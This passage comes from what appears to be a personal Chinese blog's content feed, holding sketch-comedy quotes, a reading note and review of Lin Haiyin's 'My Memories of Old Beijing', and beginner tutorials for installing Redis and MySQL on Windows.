rel="noopener">小沈阳</a>、<a href="https://baike.baidu.com/item/%E4%BA%8E%E6%B4%8B/6260468" target="_blank" rel="noopener">于洋</a>、<a href="https://baike.baidu.com/item/%E7%8E%8B%E5%B0%8F%E5%88%A9/8813192" target="_blank" rel="noopener">王小利</a>、<a href="https://baike.baidu.com/item/%E5%AD%99%E4%B8%BD%E8%8D%A3/194099" target="_blank" rel="noopener">孙丽荣</a>主演的小品，于2010年2月13日在《<a href="https://baike.baidu.com/item/2010%E5%B9%B4%E4%B8%AD%E5%A4%AE%E7%94%B5%E8%A7%86%E5%8F%B0%E6%98%A5%E8%8A%82%E8%81%94%E6%AC%A2%E6%99%9A%E4%BC%9A/8526128" target="_blank" rel="noopener">2010年中央电视台春节联欢晚会</a>》中首播。</p><p>该小品讲述了钱紧因捐钱多按了一个零产生的误会，记者采访又不好实说，和急着要钱第二天娶媳妇的白闹闹出了不少笑话。</p><p>2010年2月28日，该小品获得2010年中央电视台“我最喜爱的春节联欢晚会节目”评选语言类小品一等奖的奖项。</p><ul><li><a href="https://baike.baidu.com/item/%E6%8D%90%E5%8A%A9/4045860" target="_blank" rel="noopener">百度百科</a></li></ul><blockquote><p>白闹：平时吃一串羊肉串都得喝八瓶啤酒，后来把钎子撸得嗞嗞冒火星子，你能干出这么大事儿来我真服了你了。</p></blockquote><hr><blockquote><p>钱紧：哦，这家伙，这真是长江后浪推前浪一代更比一代长啊这。</p><p>大长脸：大爷还真幽默。</p></blockquote><hr><blockquote><p>钱紧：这回听明白了，就是搜狗，它先出来，后来我牵个绳跟着出来的。</p></blockquote><hr><blockquote><p>大长脸：不行阿，大爷这屋光线有点暗不行咱开点灯吧。</p><p>阳阳：你那镜头盖开了吗？三炮。</p><p>大长脸：哦，呵。</p><p>钱紧：你这啥队伍啊，还说我们这灯，今天还特意加了个泡呢。</p></blockquote><hr><blockquote><p>钱紧：咱孩子上学时候不也困难吗？是不是，拿俩钱不算什么，谁都不敢说这一辈子老富，这美国人就牛成啥样了，不今年也上咱这里借钱来了吗？扯啥玩意儿。</p></blockquote><hr><blockquote><p>白闹：我还乐呵呵的，我保证不哭行不？</p></blockquote><hr><blockquote><p>钱紧：你喊啥呀！他耳朵好使呢，他嘴聋。</p></blockquote><hr><blockquote><p>阳阳：白大爷你感觉亲家现在是不是很伟大？</p><p>白闹：围得太大了，把我都围进去了。</p><p>钱紧：他的意思是说，伟大的形象也有他的阴影，那什么我亲家也很伟大，他呀听我捐这些钱他心里一直激动（我我）他有话说不出来（我没）现场直播全球的。</p><p>阳阳：那大爷，你是怎么评价你亲戚这个人的呢 ？</p><p>白闹：他这个人就好比当年的三毛、哪吒、金刚葫芦娃。</p><p>阳阳：为什么都是小孩呢？</p></blockquote><hr><blockquote><p>白闹：我明白了，你这是一箭三叼啊。</p><p>钱紧：什么雕啊？</p><p>白闹：把名叼来了，把人叼来了，把我叼进去了。</p></blockquote><hr><blockquote><p>白闹：咱俩就像两堆干柴禾似的，你说你把你那边燎的挺旺回身一泡尿把我的浇灭了，你啥人呀。</p></blockquote><hr><blockquote><p>钱紧：你采访她有《刨根问底》呢？</p><p>白闹：他刨的不深，我的往祖坟上刨。</p></blockquote><hr><h1 id="7-心病央视2003"><a class="markdownIt-Anchor" href="#7-心病央视2003"></a> 7 《心病》(央视2003)</h1><p>《心病》是由<a href="https://baike.baidu.com/item/%E5%B0%B9%E5%85%B4%E5%86%9B/7711126" target="_blank" rel="noopener">尹兴军</a>导演，<a href="https://baike.baidu.com/item/%E4%BD%95%E5%BA%86%E9%AD%81/5230744" target="_blank" rel="noopener">何庆魁</a>、武扬编剧，<a href="https://baike.baidu.com/item/%E8%B5%B5%E6%9C%AC%E5%B1%B1/131652" target="_blank" rel="noopener">赵本山</a>、<a href="https://baike.baidu.com/item/%E8%8C%83%E4%BC%9F/10184" target="_blank" rel="noopener">范伟</a>、<a href="https://baike.baidu.com/item/%E9%AB%98%E7%A7%80%E6%95%8F/1477886" target="_blank" rel="noopener">高秀敏</a>在《<a href="https://baike.baidu.com/item/2003%E5%B9%B4%E4%B8%AD%E5%A4%AE%E7%94%B5%E8%A7%86%E5%8F%B0%E6%98%A5%E8%8A%82%E8%81%94%E6%AC%A2%E6%99%9A%E4%BC%9A/6144078" target="_blank" rel="noopener">2003年中央电视台春节联欢晚会</a>》上表演的小品，该小品于2003年1月31日播出。</p><p>该小品讲述了心理医生赵大宝为中了三百万大奖的村民老范化解心理疾病的故事。</p><p>2003年2月15日，该小品获得2003年中央电视台“我最喜爱的春节联欢晚会节目”评选小品类一等奖的奖项。</p><ul><li><a href="https://baike.baidu.com/item/%E5%BF%83%E7%97%85/13236091#viewPageContent" target="_blank" rel="noopener">百度百科</a></li></ul><blockquote><p>赵大宝：不用说，你一定患有更年期综合紊乱症，来，张嘴我看看轮胎……我要看看舌苔。</p></blockquote><hr><blockquote><p>老范媳妇：呀，大夫，大夫你别管几个病，你要能把他病治好了我多给你钱。</p><p>赵大宝：哎呀吗呀，别提……怎么提什么钱这么俗呐！啊？不给钱就不看病了，这人都咋的了，张嘴钱儿闭嘴钱儿的，为人民服务、救死扶伤都给谁说的……能给多少钱呐？</p></blockquote><hr><blockquote><p>赵大宝：不打针，不吃药，坐这就是跟你唠，用谈话的方式治疗，也叫“话疗”。</p></blockquote><hr><blockquote><p>赵大宝：坐好啊！下面请听第一个话题，母猪的产后护理……拿错书了。请听第一话题：萨达姆做好了战斗……这也不行，哎呀，我这知识啊都学杂啦！</p></blockquote><hr><blockquote><p>赵大宝：别打岔，整没了。在岁月的长河中，人，好比天上的流星，来匆匆，去匆匆。唰！说没就没啊！</p></blockquote><hr><blockquote><p>赵大宝：好，这个话题好！人，为什么活着呢？简单说为了一个字，为了一个“情”。兄弟，你就活错了，三千块钱奖金你就能抽过去，你不觉得这小风抽的该有如此荒诞吗？想开吧，说：人生在世屈指算，一共三万六千天。家有房屋千万座，睡觉就须三尺宽。总结起来四句话：说人好比盆中鲜花，生活就是一团乱麻；房子修的再好那是个临时住所，这个“小盒”才是你永久的家呀。</p></blockquote><hr><blockquote><p>赵大宝：我的妈呀！还有意外收获！</p></blockquote><hr><blockquote><p>赵大宝：不抽也没事，初恋的根本不懂爱情，谈下一话题！</p></blockquote><h1 id="8-央视"><a class="markdownIt-Anchor" href="#8-央视"></a> 8 《》（央视）</h1><ul><li><a href>百度百科</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
            <tag> 摘抄 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《城南旧事》书籍</title>
      <link href="/2022/02/15/%E3%80%8A%E5%9F%8E%E5%8D%97%E6%97%A7%E4%BA%8B%E3%80%8B%E4%B9%A6%E7%B1%8D/"/>
      <url>/2022/02/15/%E3%80%8A%E5%9F%8E%E5%8D%97%E6%97%A7%E4%BA%8B%E3%80%8B%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>让实际的童年过去，心灵的童年永存下来。——林海音</p><p>《城南旧事》是著名女作家林海音于一九六〇年出版的以其七岁到十三岁的生活为背景的一部自传体短篇小说集。 它描写二十世纪二十年代，北京城南一座四合院里，住着英子温暖和睦的一家。它透过主角英子童稚的双眼，向世人展现了大人世界的 悲欢离合，有一种说不出来的天真，却道尽人世复杂的情感，感动了一代又一代的读者。</p><p>————————<br>【编辑推荐】<br>1、“台湾文学的祖母级人物”林海音自传体小说。五十年来，一直感动着我们的经典故事。<br>2、据台湾原版重排、修订的版本；采用“企鹅经典”等国际上流行的便携式开本，随时随地可以品读经典。中国台湾知名设计师手绘封面，内页采用进口的轻型纸，柔软，便于翻阅。<br>3、教育部统编语文教材必读书目，其中篇目多次入选中小学语文课本。<br>4、 入选《亚洲周刊》“二十世纪中文小说一百强”，百年百种优秀中国文学图书。<br>超暖心课外读物，适合所有7岁以上的人阅读，讲述亲情与友情，离别与成长。</p><p>————————<br>【媒体及名人评价】</p><p>上海是张爱玲的，北京是林海音的。——余光中</p><p>林海音的文笔善于写动作和声音，而她又从不滥用渲染，不多用长句，淡淡几笔，情景立现。因此看似简单的回忆，却能深深地感动人。——齐邦媛（《巨流河》作者）</p><p>中国乡愁文学的最后一笔终于随着运煤骆驼队走进淡淡的水墨山影里，不必叮咛，不带惊讶，依稀听到的是城南那个小女孩花树下的笑语和足音。林先生永远不老，像英子。——董桥</p><p>林海音先生是台湾“京味儿”作品的代表人物。——舒乙</p><p>我被小说《城南旧事》中那种沉沉的相思、淡淡的哀愁深深打动了，整部小说充满了朴素、温馨的思想感情。当这部影片上映后，这种情感同样打动了无数的观众。——吴贻弓（电影《城南旧事》导演）</p><p>女性作家文笔的细腻清秀或者真挚热烈都不困难，但能够懂得幽默却不容易，须大家方可。因为幽默本是智慧的高级表达形式，我喜爱林海音，这也是一个重要的缘由。——中国作协主席 铁凝</p><p>为什么我们不来造一些字，造一些真正的敬辞，好来呈献给这位刚刚逝去的长者——一个在文化困境中流离的灵魂，却以整个生命的光与热情修补了每一道创痕的妇人。——席慕容</p><h1 id="2-作者"><a class="markdownIt-Anchor" href="#2-作者"></a> 2 作者</h1><p>林海音（1918年3月18日—2001年12月1日），本名林含英，中国当代女作家，台湾苗栗县头份镇人，祖籍广东蕉岭。</p><p>1918年3月18日，出生于日本大阪。1934年，考入<a href="https://baike.baidu.com/item/%E5%8C%97%E5%B9%B3%E6%96%B0%E9%97%BB%E4%B8%93%E7%A7%91%E5%AD%A6%E6%A0%A1/22498108" target="_blank" rel="noopener">北平新闻专科学校</a>。1937年，从北平新闻专科学校毕业后任《世界日报》记者、编辑。1955年，出版第一本散文集《冬青树》。1956年，获得第二届扶轮社文学奖。1959年，出版第一部长篇小说《<a href="https://baike.baidu.com/item/%E6%99%93%E4%BA%91/2451008" target="_blank" rel="noopener">晓云</a>》。1960年，出版小说集《<a href="https://baike.baidu.com/item/%E5%9F%8E%E5%8D%97%E6%97%A7%E4%BA%8B/1348801" target="_blank" rel="noopener">城南旧事</a>》。1972年，出版散文集《窗》。1988年，出版散文集《一家之主》。1998年，获得第三届世界华文作家大会终身成就奖。2000年，出版散文集《<a href="https://baike.baidu.com/item/%E4%BD%9C%E5%AE%A2%E7%BE%8E%E5%9B%BD/12483090" target="_blank" rel="noopener">作客美国</a>》《<a href="https://baike.baidu.com/item/%E8%8A%B8%E7%AA%97%E5%A4%9C%E8%AF%BB/12483092" target="_blank" rel="noopener">芸窗夜读</a>》。2001年12月，因病逝世于台北。</p><ul><li><a href="https://baike.baidu.com/item/%E6%9E%97%E6%B5%B7%E9%9F%B3/1356252" target="_blank" rel="noopener">百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/%E6%9E%97%E6%B5%B7%E9%9F%B3" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="3-摘抄"><a class="markdownIt-Anchor" href="#3-摘抄"></a> 3 摘抄</h1><blockquote><p>我站在骆驼面前，看它们吃草料咀嚼的样子：那样丑的脸，那样长的牙，那样安静的态度，它们咀嚼的时候，上牙和下牙交错的磨来磨去，大鼻孔里冒着热气，白沫子沾满在胡须上。我看得呆了，自己的牙齿也动起来。</p><p>老师教给我，要学骆驼，沉得住气的动物。看它从不着急，慢慢地走，慢慢地嚼，总会走到的，总会吃饱的。也许它们天生是该慢慢的，偶然躲避车子跑两步，姿势很难看。</p><p>骆驼队过来时，你会知道，打头儿的那一匹，长脖子底下总会系着一个铃铛，走起来，“当，当，当”的响。</p><p>“为什么要系一个铃铛？”我不懂的事就要问一问。</p><p>爸爸告诉我，骆驼很怕狼，因为狼会咬他们，所以人类给它们戴上了铃铛，狼听见铃铛的声音，知道那是有人类在保护，就不敢侵犯了。</p><p>我的幼稚心灵中却充满了和大人不同的想法，我对爸爸说：“不是的，爸！它们软软的脚掌走在软软的沙漠上，没有一点点声音，你不是说，它们走上三天三夜都不喝一口水，只是不声不响的咀嚼着从胃里倒出出来的食物吗？一定是拉骆驼的人类，耐不住那长途寂寞的旅程，所以才给戴上了铃铛，增加一些行路的情趣。”</p><p>爸爸想了想，笑笑说：“也许，你的想法更美些。”</p><p>***</p><p>夏天过去，秋天过去，冬天又来了，骆驼队又来了，但是童年却一去不还。冬阳底下学骆驼咀嚼的傻事，我是再也不会做了。</p><p>可是，我是多么的想念童年住在北京城南的那些景色和人物啊！我对自己说，把它们写下来吧，让实际的童年过去，心灵的童年永存下来。</p><p>—— <font color="green">引自 冬日，童年，骆驼队</font></p></blockquote><hr><blockquote><p>我这时看看胡同里，没有一个人走过。真奇怪，我现在怕的不是疯子，倒是怕人家看见我跟疯子拉手了。</p><hr><p>我想着想着觉得自己在渐渐地升高，升高，我是躺在这里，高、高、高，鼻子要碰到屋顶了，“呀！”我浑身跳了一下，又从上面掉下来，一惊疑就睁开了眼睛。只听宋妈说：</p><p>“好了，醒了！”</p><hr><p>我觉得很新鲜，转身脸向着车后，跪在座位上，向街上呆呆地看。两边的树一棵棵地落在车后面，是车在走呢？是树在走呢？</p><hr><p>新的家？妈妈刚说这是“将来”的事，怎么这样快就到眼前了？</p><p>那么我就要放开蒙在脸上的手了。</p><p>—— <font color="green">引自 惠安馆</font></p></blockquote><hr><blockquote><p>门外一块圆场地，全被太阳照着，就像盛得满满的一匙汤。</p><hr><p>“好人，坏人，这是我最没有办法分清楚的事，怎么他也来问我呢？我摇摇头。 　“不是好人？”他瞪起眼，指着自己的鼻子。</p><p>我还是摇摇头。</p><p>“不是坏人？”他笑了，眼泪从眼屎后面流出来。</p><p>“我不懂什么好人，坏人，人太多了，很难分。”我抬头看看天，忽然想起来了。“你分得清海跟天吗？我们有一课书，我念给你听。”</p><p>我就背起“我们看海去”那课书，我一句一句慢慢地念，他斜着头仔细地听。我念一句，他点头“嗯”一声。念完了我说：</p><p>“金红的太阳是从蓝色的大海升上来的吗？可是它也从蓝色的天空升上来呀？我分不出海跟天，我分不出好人跟坏人。”</p><p>“对，”他点点头很赞成我：“小妹妹，你的头脑好，将来总有一天你分得清这些。将来，等我那兄弟要坐大轮船去外国念书的时候，咱们给他送行去，就可以看见大海了，看它跟天有什么不一样。”</p><p>—— <font color="green">引自 我们看海去</font></p></blockquote><hr><blockquote><p>—— <font color="green">引自 兰姨娘</font></p></blockquote><hr><blockquote><p>她说着停了手里的活儿，举起锥子在头发里划几下，自言自语地说：“今年个，可得回家看看了，心里老不顺序。”她说完愣愣的，不知在想什么。</p><hr><p>—— <font color="green">引自 驴打滚儿</font></p></blockquote><hr><blockquote><p>爸爸说：“英子，不要怕，无论什么困难的事，只要硬着头皮去做，就闯过去了。”</p><hr><p>我哭了，我们毕业生都哭了。我们是多么喜欢长高了变成大人，我们又是多么怕呢！</p><hr><p>做大人，常常有人要我做大人。</p><p>宋妈临回她的老家的时候说：</p><p>“英子，你大了，可不能跟弟弟再吵嘴！他还小。”</p><p>兰姨娘跟着那个四眼狗上马车的时候说：</p><p>“英子，你大了，可不能招你妈妈生气了！”</p><p>蹲在草地里的那个人说：</p><p>“等到你小学毕业了，长大了，我们看海去。”</p><p>虽然，这些人都随着我的长大没有了影子了。是跟着我失去的童年一起失去了吗？</p><hr><p>我虽然很害怕，但是也得硬着头皮去。这是爸爸说的，无论什么困难的事，只要硬着头皮去做，就闯过去了。</p><hr><p>走过院子，看到那垂落的夹竹桃，我默念着：</p><p>爸爸的花儿落了，</p><p>我也不再是小孩子</p><p>—— <font color="green">引自 爸爸的花儿落了 我也不再是小孩子</font></p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>第二次看，第一次是去年在华为南研所实习期间阅读的。</p><p>这是一本很安静的书，只有自己静下来了，才能走进书本中去，才能与自己产生连接。</p><p>也有对应的电影，1983年的老电影，同样的安静，与书籍很契合。</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><blockquote><center>如果这就是成长</center><p>一直以来我都认为，阅读是需要心境的，在什么样的年纪读什么样的书，倘若你觉得一本书不好，很有可能是你没有读懂它，或许再过一些年来读，会疑惑于自己当年的不以为然。对于我来说，林海音的《城南旧事》早已是耳熟能详，可是曾经在书店无数次的翻开它，却从来也提不起阅读的兴趣。到我真正喜欢上这本书的时候，才发现它一直静静在那个角落等我，从来不曾远离。</p><p>三毛曾经说过：“童年，只有在回忆中才成就了那么完美。”可是在林海音的笔下，这个童年故事却饱含了一种凄婉的味道，仿佛那不是一个平凡的小说故事，而是关于过去的真实回忆。</p><p>整本书分为《惠安馆》、《我们看海去》、《兰姨娘》、《驴打滚儿》、《爸爸的花儿落了我也不再是小孩子》五个短篇故事，每一篇都浸染了浓浓的惆怅，这是怀念特有的忧郁滋味，典雅柔美，令人叹息。</p><p>《惠安馆》里痴痴等待着情人归来的秀贞让我不禁想起了那个关于“望夫石”的古老传说，可是，命运更加不幸的秀贞在离别前夕怀上了那个男子的骨肉，负心的男子一去不回，而刚刚生下来的爱情结晶便被狠心的母亲抛弃在荒凉的遥远地方。不能经受双重打击的秀贞精神失常，整日整夜的念叨着旧日情人思康以及可怜的孩子“小桂子”。作为旁观者的英子善良的心里对秀贞抱着深深的同情，期望着她的好转。有一天她发现自己的好友——命途多舛的妞儿竟然是那个被遗弃的小桂子，她毫不犹豫的拿走了母亲的金镯子，送给秀贞和妞儿作为盘缠，并将她们送上了火车，去寻觅那个男子。</p><p>“我们看海去！/我们看海去！/蓝色的大海上，/扬着白色的帆。/金色的太阳，/从海上升起来，/照到海面照到船头。/我们看海去！/我们看海去！”好一首优美和快乐的诗，深深喜爱它的英子对着那个草丛里面偶遇的奇怪的人吟诵。这个看起来一点也不坏的人答应和她一起去看海，就在供养他弟弟到漂洋过海去念书的时候，可是，在满天夕阳里英子只看到这个善良的哥哥被警察带走，英子知道他偷窃是为了弟弟的学业。可是为什么一个不坏的人会被抓走，是什么吞噬了他？英子并不明白，因为这个社会的黑暗还没有在她纯真的心灵上投下阴影。</p><p>看到英子竭力撮合兰姨娘和德先的小手段，我不禁哑然失笑，孩童的心思总是天真无邪，她只为了看到母亲的笑颜，便决定将纠缠着父亲的兰姨娘交给德先，让其远离父亲的身边。得知她的杰作之后，她母亲带着微笑问她：“你那天说要买什么来着？”她毫不迟疑的说：“一副滚铁环，一双皮鞋，现在我还要加上订一整年的《儿童世界》。”一个带着得意神态的小小女孩子的可爱形象跃然纸上。</p><p>《驴打滚儿》里面的宋妈无疑是让人同情的，她在同一时刻得知儿子溺水身亡和女儿被送人两个沉痛的消息，几乎精神崩溃。后来她又带着英子满城寻找那杳无踪影的小女儿，却没有任何消息。在彻底绝望之后，她决心回到家乡，再生育儿女，重拾做母亲的滋味。旧社会的穷人家里上演着各式各样的悲剧，而宋妈就像鲁迅先生笔下的祥林嫂，失去了自己心爱的儿女。故事里的宋妈还有开始新生活的勇气，而可怜的祥林嫂却在满城的祝福声中凄凉的死去了，这样的结局令人叹惋。</p><p>故事里的英子在六年之后终于如愿成为了毕业生代表上台领奖，当她发现离别近在眼前的时候，骊歌声早已响起。唱了五年的骊歌，终于轮到同学们为他们唱，这时所有的毕业生都流下了泪水。当英子拿着小学毕业文凭匆忙的赶回家中时，她的心里似乎在害怕赶不上什么事情。果然，她心里的预感变成了现实。走进家门，弟弟妹妹们还坐在院子里玩耍，而爸爸种的石榴却落下来了。这时厨子老高让她去医院好好劝劝妈妈，英子变得如此的平静。当她爸爸的花儿落下，她已不再是小孩子。</p><p>这样一部安静的小说，它不是一个故事，而是一部关于成长的寓言。那些点缀在英子人生旅途中的人和事，就这样匆匆远离。昔日像一首诗，躺在回忆的深处，不曾忘记也不需要想起，因为他们早已是她生命的一部分。</p><p>伤离别是人生最为痛苦的一件事，撕心裂肺的痛楚往往让人迷失自我，过了许多年想起来还是伤心。记得一首令人怅惘的词：“把酒祝东风，且共从容。垂杨紫陌洛城东，总是当年携手处，游遍芳丛。聚散苦匆匆，此恨无穷。今年花胜去年红，可怜明年花更好，知与谁同？”</p><p>我们也曾经像英子一样唱那首忧郁的骊歌：“长亭外，古道边，芳草碧连天。晚风拂柳笛声残，夕阳山外山。天之涯，地之角，知交半零落。一瓢浊酒尽余欢，今宵别梦寒。”我们一直都在离别，和我们的朋友，家人，旧时光里的自己，在哀叹离伤的同时，我们发现自己已经悄悄的长大了。</p><p>其实，每个人心中都有自己的城南旧事，那飘逸在童年角落让人回味无穷的点点滴滴，或喜或悲。请不要为了那业已消逝的时光而怅惘，如果这就是成长，那么就让我们安之若素。</p><p>—— <font color="blue">引自 <a href="https://book.douban.com/review/1958684/?dt_dapp=1&amp;dt_platform=com.douban.activity.qq_session" target="_blank" rel="noopener">豆瓣 明月楼</a></font></p></blockquote><h1 id="6-拓展"><a class="markdownIt-Anchor" href="#6-拓展"></a> 6 拓展</h1><ul><li>电影：<a href="https://dragonliu.tk/2022/01/21/%E7%A4%BA%E4%BE%8B-%E3%80%8A%E5%9F%8E%E5%8D%97%E6%97%A7%E4%BA%8B%E3%80%8B%E7%94%B5%E5%BD%B1/" target="_blank" rel="noopener">《城南旧事》(1983)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下安装Redis</title>
      <link href="/2022/02/15/Windows%E4%B8%8B%E5%AE%89%E8%A3%85Redis/"/>
      <url>/2022/02/15/Windows%E4%B8%8B%E5%AE%89%E8%A3%85Redis/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>最近在Windows上运行若依系统，需要配置Redis，但是这台笔记本上还没安装，整理下。</p><p>Redis官网：<a href="http://www.redis.cn/" target="_blank" rel="noopener">http://www.redis.cn/</a></p><p>主要copy于 <a href="https://blog.csdn.net/BADAO_LIUMANG_QIZHI/article/details/107486313" target="_blank" rel="noopener">Windows中Redis的下载安装与修改密码并启动</a></p><h1 id="2-下载安装包"><a class="markdownIt-Anchor" href="#2-下载安装包"></a> 2 下载安装包</h1><p>Github下载安装包：<a href="https://github.com/microsoftarchive/redis/releases" target="_blank" rel="noopener">Redis Installer</a></p><p>选择 zip 和 msi 下载都可以，测试使用的 msi。</p><h1 id="3-安装redis"><a class="markdownIt-Anchor" href="#3-安装redis"></a> 3 安装Redis</h1><ol><li><p>双击下载好的安装文件<code>Redis-x64-3.0.504.msi</code>打开安装程序</p></li><li><p>安装时注意将路径加到PATH中：</p><img src="https://s2.loli.net/2022/02/15/DI97iLym3PEAgKQ.png" width="500" height="400" alt="图片名称" align="center" id="88"></li><li><p>其他的，如端口等默认选项即可：</p><img src="https://s2.loli.net/2022/02/15/qtfIWCcn57aK9iV.png" width="500" height="400" alt="图片名称" align="center" id="89"></li></ol><h1 id="4-测试"><a class="markdownIt-Anchor" href="#4-测试"></a> 4 测试</h1><ol><li><p><strong>启动服务端</strong>：在上述安装过程中已经自启动Redis了，如果没启动，则在Redis安装目录打开命令行并执行：<code>redis-server.exe redis.windows.conf</code></p><img src="https://s2.loli.net/2022/02/15/26qd8Am9QscVbBh.png" width="700" height="300" alt="图片名称" align="center" id="97"></li><li><p><strong>启动客户端</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里的123456是上面自己设置的密码</span></span><br><span class="line">D:\developer\database\redis\soft&gt;redis-cli.exe -h 127.0.0.1 -p 6379 -a 123456</span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="5-redis管理软件redis-desktop-manager"><a class="markdownIt-Anchor" href="#5-redis管理软件redis-desktop-manager"></a> 5 Redis管理软件（Redis Desktop Manager）</h1><ol><li><p>从<code>0.9.3.817</code>版本后就开始收费了。当然，源码始终是开源的，需要自行编译，有已经编译好的版本：</p><ul><li><a href="https://springboot.io/t/topic/2394" target="_blank" rel="noopener">新版的RedisDesktopManager下载</a></li><li><a href="https://github.com/qishibo/AnotherRedisDesktopManager/releases" target="_blank" rel="noopener">Github-AnotherRedisDesktopManager</a> （实验中使用的软件）</li></ul></li><li><p>新建连接，默认即可：</p><img src="https://s2.loli.net/2022/02/15/41cJfXTdwL75Zzj.png" width="600" height="400" alt="图片名称" align="center" id="90"></li><li><p>运行完若依系统后，已经有了数据：</p><img src="https://s2.loli.net/2022/02/15/jwqznTsJZMLPF21.png" width="600" height="400" alt="图片名称" align="center" id="96"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下安装MySQL</title>
      <link href="/2022/02/15/Windows%E4%B8%8B%E5%AE%89%E8%A3%85MySQL/"/>
      <url>/2022/02/15/Windows%E4%B8%8B%E5%AE%89%E8%A3%85MySQL/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>最近在Windows上运行若依系统，需要配置MySQL，但是这台笔记本上还没安装，整理下。</p><p>主要copy于 <a href="https://blog.csdn.net/zhouzezhou/article/details/52446608" target="_blank" rel="noopener">windows10上安装mysql（详细步骤)</a></p><h1 id="2-下载安装包"><a class="markdownIt-Anchor" href="#2-下载安装包"></a> 2 下载安装包</h1><p>官网下载：<a href="https://dev.mysql.com/downloads/installer/" target="_blank" rel="noopener">MySQL Installer</a></p><img src="https://s2.loli.net/2022/02/15/G5fRJ39EiONYtPk.png" width="500" height="300" alt="图片名称" align="center" id="77"><p>下载速度较慢，使用迅雷下载提速。</p><h1 id="3-安装mysql"><a class="markdownIt-Anchor" href="#3-安装mysql"></a> 3 安装Mysql</h1><ol><li><p>双击下载好的mysql安装文件<code>mysql-installer-community-8.0.28.0.msi</code>打开安装程序，打开后需要稍等一下</p></li><li><p>选择安装类型（根据个人需要）：此处我只需要server，所以选择<code>Custom</code></p><img src="https://s2.loli.net/2022/02/15/7WyjMUGDVnhOAqS.png" width="500" height="400" alt="图片名称" align="center" id="78"></li><li><p>Select Products：（注意这个地方把软件安装目录和数据目录换成非C盘，因为毕设后期数据量可能比较大）</p><img src="https://s2.loli.net/2022/02/15/HlXf5NxgyJtszQb.png" width="500" height="400" alt="图片名称" align="center" id="79"></li><li><p>点击“Execute”（执行）开始安装，安装过程中会显示安装的Progress（进度），等待安装完成后Status会显示Complete，mysql图标前会出现一个绿色的勾，然后点击“Next”按钮进入产品配置界面：</p><img src="https://s2.loli.net/2022/02/15/T2tvdulYaBz7gSh.png" width="500" height="400" alt="图片名称" align="center" id="80"></li><li><p><code>Type and Networking</code>：默认即可</p><img src="https://s2.loli.net/2022/02/15/wWPQ8dqK2MUaHso.png" width="500" height="400" alt="图片名称" align="center" id="81"></li><li><p><code>Authentication Method</code>：安装目的是学习使用，所以使用下面的选项即可：</p><img src="https://s2.loli.net/2022/02/15/E9vOgrqcRf1B4b2.png" width="500" height="400" alt="图片名称" align="center" id="82"></li><li><p>设置密码等默认操作即可，其中mysql server的名称默认是<code>MySQL80</code>，默认开机自启动。</p></li></ol><h1 id="4-配置mysql环境变量非必要"><a class="markdownIt-Anchor" href="#4-配置mysql环境变量非必要"></a> 4 配置mysql环境变量（非必要）</h1><p>说明：给mysql配置环境变量后我们就可以在cmd里运行mysql（开启、停止等操作）</p><ol><li><p>选中系统变量中的<code>path</code>，在path值开头处输入mysql安装目录下的bin文件夹所在路径（默认是<code>C:\Program Files\MySQL\MySQL Server x.x</code>，但是此处我做了修改），保存退出；</p></li><li><p>测试是否配置成功：打开cmd，输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Dragon Liu&gt;mysql -u root -p</span><br><span class="line">Enter password: ****</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 10</span><br><span class="line">Server version: 8.0.28 MySQL Community Server - GPL</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2022, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">'help;'</span> or <span class="string">'\h'</span> <span class="keyword">for</span> <span 